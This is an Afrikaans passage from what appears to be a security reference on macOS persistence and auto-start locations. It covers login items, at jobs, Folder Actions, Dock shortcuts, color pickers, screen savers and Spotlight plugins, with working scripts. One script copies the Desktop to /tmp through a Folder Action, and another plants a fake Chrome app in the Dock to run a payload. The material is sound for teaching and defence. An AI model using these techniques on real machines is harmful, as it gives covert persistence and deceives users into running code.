Vir ’n gebundelde launch-plist, los `BundleProgram` op relatief tot die app-bundel se wortel (byvoorbeeld `Contents/MacOS/Helper`), soos [Apple se leiding oor die migrasie van Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) spesifiseer. ’n Leesalleen-inventaris van `/Applications` op die navorsings-Mac het 14 gebundelde helper-inskrywings en vyf `BundleProgram`-verklarings gevind; al vyf teikens kon opgelos word, en twee het ’n gebruikerskryfbaarheidstoets geslaag. Dié toets stel **nie** vas dat enige van die helpers geregistreer of geaktiveer is, ná handtekeningvalidering uitvoerbaar is, of deur ’n sandbox bereik kan word nie. `sfltool dumpbtm` het 150 benoemde rekords op hierdie Mac gelys; dit is ’n hulpmiddel vir inspeksie, nie ’n toets wat bewys dat elke rekord loop nie.

Ouer aanmelditems kan ook deur Apple events bestuur word. Dit is moontlik om hulle vanaf die opdragreël te lys, by te voeg en te verwyder, hoewel byvoeging die gebruiker se volgehoue aanmeldkonfigurasie verander en moontlik Automation-goedkeuring vereis:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` is ’n implementeringsdetail, nie ’n ondersteunde plek om ’n payload te installeer deur bloot ’n lêer neer te skryf nie. Die ouer `SMLoginItemSetEnabled`-API is vir nuwe helpers deur `SMAppService` vervang; die bladsy se voormalige `/var/db/com.apple.xpc.launchd/loginitems.501.plist`-pad was afwesig op die macOS 26.5.2-to masjien. Gebruik die registrasie-API en stelsel-UI-toestand wanneer jy moderne aanmelditems beoordeel, nie ’n veronderstelde databasispad nie.

### ZIP as Login Item

(Kyk na die vorige afdeling oor Login Items; dit is ’n uitbreiding)

As jy ’n **ZIP**-lêer as ’n **Login Item** stoor, sal die **`Archive Utility`** dit oopmaak. As die zip byvoorbeeld in **`~/Library`** gestoor is en die vouer **`LaunchAgents/file.plist`** met ’n backdoor bevat, sal daardie vouer geskep word (dit bestaan nie by verstek nie) en die plist sal bygevoeg word. Die volgende keer dat die gebruiker weer aanmeld, sal die **backdoor wat in die plist aangedui word, uitgevoer word**.

Nog ’n opsie is om die lêers **`.bash_profile`** en **`.zshenv`** in die gebruiker se HOME te skep, sodat hierdie tegniek steeds werk as die LaunchAgents-vouer reeds bestaan.

### At

Skrywe: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees

#### **Beskrywing**

`at`-take is ontwerp om **eenmalige take te skeduleer** wat op bepaalde tye uitgevoer moet word. Anders as cron-take, word `at`-take ná uitvoering outomaties verwyder. Dit is belangrik om daarop te let dat hierdie take ná stelselherlaaie behoue bly, wat hulle onder sekere omstandighede ’n potensiële sekuriteitsrisiko maak.<sup>[[16]](#references)</sup>

Die gebundelde `com.apple.atrun.plist` het `Disabled = true`, maar launchd hou effektiewe geaktiveerde/gedeaktiveerde oorheersings apart. Op die macOS 26.5.2-toetsmasjien het `launchctl print-disabled system` gerapporteer dat `com.apple.atrun` **geaktiveer** is, ondanks daardie gebundelde sleutel. Gaan die effektiewe toestand na voordat jy beweer dat `at`-take sal loop:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

'n Administrateur kan 'n gedeaktiveerde `atrun`-diens met `launchctl` aktiveer; die volgende historiese voorbeeld verander die stelseldiensstatus en is **nie** op die navorsings-Mac uitgevoer nie:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dit sal oor 1 uur 'n lêer skep:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Gaan die taakry na met `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Hierbo kan ons sien dat twee take geskeduleer is. Ons kan die besonderhede van die taak vertoon met `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **taaklêers** kan gevind word by `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Die lêernaam bevat die tou, die taaknommer en die tyd waarop dit geskeduleer is om te loop. Kom ons kyk byvoorbeeld na `a0001a019bdcd2`.

- `a` - dit is die tou
- `0001a` - taaknommer in heksadesimaal, `0x1a = 26`
- `019bdcd2` - tyd in heksadesimaal. Dit verteenwoordig die minute wat sedert epoch verby is. `0x019bdcd2` is `26991826` in desimale formaat. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat is `GMT: 2021. 27 April, Dinsdag 7:46:00`.

As ons die taaklêer druk, vind ons dat dit dieselfde inligting bevat as wat ons met `at -c` gekry het.

### Calendar-waarskuwings vir oop lêers

- **Skryfdoelwit:** 'n Uitvoerbare app-bundel of 'n ander lêer wat **reeds gekies is** deur 'n Calendar-gebeurtenis se pasgemaakte **Open file**-waarskuwing. Om die waarskuwing self te skep of te wysig, vereis toegang tot daardie Calendar-gebeurtenis via Calendar of 'n aanvaarde kalenderdatabron; 'n ewekansige lêerskryf skep nie 'n waarskuwing nie.
- **Sneller:** Die waarskuwing se geskeduleerde tyd op 'n Mac waarop Calendar die gebeurtenis verwerk. 'n Herhalende gebeurtenis kan die aksie herhaal. [Apple se huidige Calendar-gids](https://support.apple.com/guide/calendar/icl1012/mac) bevestig die **Custom → Open file**-waarskuwingsopsie op macOS 26.
- **Uitvoeringsidentiteit en voorwaardes:** Calendar maak die gekose lêer vir die aangemelde gebruiker oop deur die toepassing wat daarmee geassosieer word. Die lansering van 'n app-bundel kan die kode daarvan as daardie gebruiker uitvoer, onderhewig aan Gatekeeper, kwarantyn en ander macOS-kontroles. 'n Gewone skriplêer kan bloot in 'n redigeerder oopmaak; die lêeruitbreiding alleen bewys nie dat kode uitgevoer word nie.

Om 'n kandidaat veilig te beoordeel, inspekteer die gebeurtenis se waarskuwing in Calendar en die gekose lêer se toestemmings. Hierdie roete is op grond van Apple se gids gedokumenteer en **is nie** op die navorsings-Mac uitgevoer nie, omdat toetsing 'n lewendige kalender sou wysig en vir 'n lessenaatgebeurtenis sou wag. In 'n weggooibare rekening kan 'n toets 'n app-bundel wat slegs 'n merker skep, kies, 'n Open file-waarskuwing vir 'n nabye tyd instel, die lansering bevestig en daarna die gebeurtenis en app uitvee.

### Shortcuts-outomatiserings op macOS

- **Skryfdoelwit:** 'n Uitvoerbare lêer waarna 'n kortpad se aksie **reeds verwys**, of 'n bestaande kortpad wat 'n gemagtigde gebruiker kan wysig. 'n Ewekansige `.shortcut`-lêer of 'n skrywing na 'n ongedokumenteerde Shortcuts-databasis is nie 'n ondersteunde metode om 'n outomatisering te registreer nie.
- **Sneller en identiteit:** 'n Voorheen gekonfigureerde, geaktiveerde outomatiseringsgebeurtenis, soos 'n tyd van die dag of 'n app-gebeurtenis, roep die kortpad vir die aangemelde gebruiker aan. [Apple se huidige Mac-outomatiseringsgids](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lys ondersteunde gebeurtenisse, verduidelik wanneer 'n outomatisering sonder toestemming kan loop en beskryf hoe om 'n sneller te verwyder. [Apple se Shortcuts-privaatheidsgids](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) vereis **Allow Running Scripts** vir skripaksies, en individuele aksies kan steeds toestemmings versoek.

Dit is 'n voorwaardelike skryf-na-uitvoering-roete **slegs wanneer die bestaande aksie 'n skryfbare doelwit laai**. Die skep van 'n nuwe outomatisering deur die UI verander lewendige instellings en is nie op die navorsings-Mac probeer nie. In 'n weggooibare rekening kan 'n eienaar 'n tyd-van-die-dag-kortpad instel waarvan die skrip `/tmp/ht-shortcuts-marker` skep, die nodige toestemmings aktiveer, die merker ná die gebeurtenis bevestig en dan die outomatisering, kortpad en merker uitvee.

### Automator-aksies en Quick Actions

- **Skryfdoelwitte:** `~/Library/Automator/*.action` (gebruiker) en `/Library/Automator/*.action` (administrateur) vir aksiebundels. 'n Gestoorde Quick Action-werkvloei word gewoonlik in `~/Library/Services/*.workflow` gehou; kontroleer die werklike werkvloeipad wat die gebruiker gekies het. [Apple se Automator-raamwerkverwysing](https://developer.apple.com/documentation/automator) lys die aksiesoekgidse.
- **Sneller:** Automator laai beskikbare aksiebundels wanneer dit loop, maar 'n aksie se taak loop wanneer 'n werkvloei wat dit gebruik, uitgevoer word. 'n Quick Action loop wanneer die gebruiker dit uit Finder, Services of 'n ander vertoonde kieslys kies. 'n Folder Action-werkvloei loop wanneer items by die **reeds aangehegte** vouer gevoeg word, en 'n Calendar Alarm-werkvloei loop op die tyd van die gebeurtenis. [Apple se werkvloeitipes](https://support.apple.com/guide/automator/aut7cac58839/mac) onderskei tussen hierdie gebeurtenisse. Om bloot 'n aksie of werkvloei te skryf, heg nie 'n vouer aan of skeduleer 'n Calendar-gebeurtenis nie.
- **Uitvoeringsidentiteit en voorwaardes:** Die rekening wat die werkvloei uitvoer; Automator of die aanroepende app moet die aksie laai, en enige huidige kodeondertekening- of privaatheidskontroles moet dit toelaat. 'n Skryfbare aksiebundel waarna 'n aktiewe werkvloei reeds verwys, is 'n ander geval as om 'n nuwe aksie te installeer en te wag totdat dit gekies word.

Die gebruiker se `Automator`- en `Services`-gidse was teenwoordig op die macOS 26.5.2-toets-Mac; `/Library/Automator` was afwesig. Geen lewendige werkvloei is geskep, aangeheg of uitgevoer nie. Gebruik 'n weggooibare rekening en 'n merker-alleen-aksie/werkvloei om 'n spesifieke laairoete te bevestig. Die afsonderlike [Folder Actions](#folder-actions)-afdeling behandel daardie gebeurtenisbron in meer besonderhede.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente kan aanroep om **`System Events`** te kontak, sodat jy Folder Actions kan konfigureer
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit het 'n paar basiese TCC-toestemmings, soos Desktop, Documents en Downloads

#### Ligging

- **`/Library/Scripts/Folder Action Scripts`**
  - Root word vereis
  - **Sneller**: Toegang tot die gespesifiseerde vouer
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Sneller**: Toegang tot die gespesifiseerde vouer

#### Beskrywing en ontginning

Folder Actions is skripte wat outomaties deur veranderinge in 'n vouer geaktiveer word, soos wanneer items bygevoeg of verwyder word, of deur ander aksies soos die oopmaak of verander van die vouervenster se grootte. Hierdie aksies kan vir verskeie take gebruik word en kan op verskillende maniere geaktiveer word, soos deur die Finder UI of terminale opdragte.<sup>[[17]](#references)[[18]](#references)</sup>

Om Folder Actions op te stel, is daar opsies soos:

1. Skep 'n Folder Action-werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) en installeer dit as 'n diens.
2. Heg 'n skrip handmatig aan via Folder Actions Setup in die kontekskieslys van 'n vouer.
3. Gebruik OSAScript om Apple Event-boodskappe na die `System Events.app` te stuur om 'n Folder Action programmaties op te stel.
   - Hierdie metode is besonder nuttig om die aksie in die stelsel in te sluit en sodoende 'n mate van volharding te bied.

Die volgende skrip is 'n voorbeeld van wat deur 'n Folder Action uitgevoer kan word:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Om die bogenoemde script met Folder Actions te kan gebruik, compileer dit met:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nadat die script saamgestel is, stel Folder Actions op deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en spesifiek die voorheen saamgestelde script aan die Desktop-vouer heg.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Voer die opstellingskrip uit met:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Dit is hoe jy hierdie volharding via die GUI implementeer:

Dit is die script wat uitgevoer sal word:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Dan, maak die `Folder Actions Setup`-toepassing oop, kies die **vouer wat jy wil dophou** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

As jy nou daardie vouer met **Finder** oopmaak, sal jou script uitgevoer word.

Hierdie konfigurasie is in base64-formaat gestoor in die **plist** by **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Kom ons probeer nou om hierdie persistence voor te berei sonder GUI-toegang:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas opgestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Noudat ons 'n leë omgewing het

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Dit het nie vir my gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock-kortpaaie

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet 'n kwaadwillige toepassing binne die stelsel geïnstalleer hê
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
  - **Sneller**: Wanneer die gebruiker op die toepassing in die dock klik

#### Beskrywing en uitbuiting

Al die toepassings wat in die Dock verskyn, word in die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Dit is moontlik om **'n toepassing by te voeg** met net:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Deur ’n bietjie **social engineering** te gebruik, kan jy byvoorbeeld **Google Chrome** in die dock naboots en jou eie script uitvoer:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Invoermetodes

- **Skryf-teiken:** ’n Kodebevattende invoermetode-appbundel wat in `~/Library/Input Methods/` (gebruiker) of `/Library/Input Methods/` (administrateur) geïnstalleer is. Dit verskil van Apple se gewone teks `.inputplugin`-sleutelbordkarteringlêers, wat nie op hul eie ’n loonvrag met arbitrêre kode is nie.
- **Sneller:** Die gebruiker voeg die invoerbron by/aktiveer dit in **Stelselinstellings → Sleutelbord → Teksinvoer** en kies of gebruik dit dan. ’n Bundel wat bloot na die gids gekopieer is, bewys nie dat macOS dit sal begin nie. [Apple se huidige gids oor invoerbronne](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beskryf hoe om bronne te aktiveer en tussen hulle te wissel; [Apple se InputMethodKit-dokumentasie](https://developer.apple.com/documentation/inputmethodkit) dek kodebevattende invoermetodes.
- **Uitvoeringsidentiteit en beheermaatreëls:** Die metode loop vir die aangemelde gebruiker, onderhewig aan invoermetoderegistrasie, kode-ondertekening en die huidige macOS-sekuriteitskontroles. Bestaande geaktiveerde metodes met ’n skryfbare uitvoerbare lêer vereis ’n afsonderlike ondersoek van die pad en handtekening.

Apple se [ouer nota oor derdeparty-invoermetodes](https://developer.apple.com/library/archive/qa/qa1810/_index.html) het reeds gewaarsku dat die kopiëring van sekere paletmetodes na hierdie gidse nie eens veroorsaak dat hulle in Invoerbronne verskyn nie. Op die navorsings-Mac met macOS 26.5.2 bestaan die gebruikersgids, maar geen bundel is geïnstalleer of geaktiveer nie; dit is dus ’n gedokumenteerde voorwaardelike pad, nie ’n plaaslike looptydresultaat nie.

### Kleurkiesers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - ’n Baie spesifieke handeling moet plaasvind
  - Jy sal in ’n ander sandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
  - Root is nodig
  - Sneller: Gebruik die kleurkieser
- `~/Library/ColorPickers`
  - Sneller: Gebruik die kleurkieser

#### Beskrywing en uitbuiting

**Kompileer ’n kleurkieser**-bundel met jou kode (jy kan byvoorbeeld [**hierdie een gebruik**](https://github.com/viktorstrate/color-picker-plus)) en voeg ’n constructor by (soos in die [Skermbewaarder-afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wanneer die kleurkieser dan geaktiveer word, behoort jou bundel ook uitgevoer te word.

Dit is afhanklik daarvan dat ’n versoenbare app die stelselkleurpaneel oopmaak en die geïnstalleerde kieser kies. [Apple se gids oor kleurpanele](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beskryf die ou bundelliggings. ’n Plaaslike padkontrole het die ou kleurkieser-XPC-diens gevind, maar geen kieser is op die navorsings-Mac geïnstalleer of gelaai nie; moenie ’n TCC-omseiling aflei op grond van die pad alleen nie.

Let daarop dat die binêre lêer wat jou biblioteek laai ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nuttig om sandbox te omseil: **Nee, want jy moet jou eie app uitvoer**
- TCC-omseiling: Hang af van die sandbox en toestemmings van die geaktiveerde uitbreiding; geen algemene omseiling is vasgestel nie.

#### Ligging

- 'n Spesifieke app

#### Beskrywing & Uitbuiting

'n Voorbeeld van 'n toepassing met 'n Finder Sync-uitbreiding [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding word in 'n toepassing geplaas wat uitgevoer sal word. Boonop **moet dit onderteken wees** met 'n geldige Apple-ontwikkelaarsertifikaat sodat die uitbreiding sy kode kan uitvoer, moet dit **in 'n sandbox wees** (hoewel verslapte uitsonderings bygevoeg kan word) en moet dit geregistreer wees met iets soos:<sup>[[21]](#references)[[22]](#references)</sup>

'n Geïnstalleerde uitbreiding moet ook **geaktiveer** wees en opgeroep word vir 'n relevante Finder-ligging of -item; die skryf van 'n arbitrêre `.appex`-bundel is onvoldoende. [Apple se Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stel die geaktiveerde toestand beskikbaar. Die `pluginkit`-opdragte hieronder illustreer eksplisiete registrasie en aktivering, nie 'n outomatiese opstart wat slegs op 'n lêer berus nie. Hierdie metode is aan die hand van dokumentasie nagegaan, sonder dat 'n nuwe uitbreiding op die navorsings-Mac geïnstalleer of geaktiveer is.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Skermbewaarder

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n gewone toepassingsandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `~/Library/Screen Savers`
  - **Sneller**: Kies die skermbewaarder

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing en uitbuiting

Skep ’n nuwe projek in Xcode en kies die sjabloon om ’n nuwe **skermbewaarder** te genereer. Voeg dan jou kode daarby, byvoorbeeld die volgende kode om logs te genereer.<sup>[[23]](#references)[[24]](#references)</sup>

**Bou** dit en kopieer die `.saver`-bundel na **`~/Library/Screen Savers`**. Maak dan die skermbewaarder-GUI oop. As jy net daarop klik, behoort dit baie logs te genereer:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Let daarop dat jy **binne die algemene toepassing-sandbox** sal wees, omdat jy **`com.apple.security.app-sandbox`** in die entitlements van die binêre lêer wat hierdie code laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) kan vind.

Saver-kode:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight-inproppe

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n toepassingsandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Die sandbox lyk baie beperk

#### Ligging

- `~/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
- `/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - Root word vereis
- `/System/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - Root word vereis
- `Some.app/Contents/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-inprop bestuur word, word geskep.
  - ’n Nuwe toepassing word vereis

#### Beskrywing en uitbuiting

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë moontlik te maak, hou Spotlight ’n **eie databasis** by en skep dit ’n indeks deur **die meeste lêers te ontleed**, sodat lêername en hul inhoud vinnig deursoek kan word.<sup>[[25]](#references)</sup>

Die onderliggende meganisme van Spotlight behels ’n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses koördineer die hele Spotlight-diens. Daarbenewens voer verskeie 'mdworker'-daemons uiteenlopende instandhoudingstake uit, soos om verskillende lêertipes te indekseer (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-invoerproppe, of **".mdimporter-bundels**", wat Spotlight in staat stel om inhoud in ’n uiteenlopende reeks lêerformate te verstaan en te indekseer.

